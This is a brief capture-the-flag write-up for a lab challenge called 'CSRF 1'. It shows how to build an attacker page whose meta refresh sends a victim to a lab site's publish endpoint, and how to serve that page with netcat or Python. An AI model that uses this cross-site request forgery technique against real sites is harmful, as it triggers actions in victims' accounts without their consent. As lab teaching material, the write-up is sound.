# CSRF 1

#### Need to redirect the victim from the hacker site back to the main site to publish the flag. First need to create the simple fake site, there are multiple ways to do this but I chose this one.

#### From the terminal:
```
echo -e "HTTP/1.1 200 OK\r\nContent-type: text/html\r\n\r\n<html><head><meta http-equiv=\"refresh\" content=\"0; url=http://challenge.localhost/publish\"></head></html>" > index.html
```
#### Or in the text editor:
```
HTTP/1.1 200 OK
Content-type: text/html

<html>
  <head>
    <meta http-equiv="refresh" content="0; url=http://challenge.localhost/publish\">
  </head>
</html>
```
--------------------------------------

#### Now need to start up a server to listen, can use netcat:

```cat index.html | nc -l -p 1337 -q 1```

#### Or Python

```python3 -m http.server 1337```

----------------------------------

#### Then run the victim command and login for the flag.
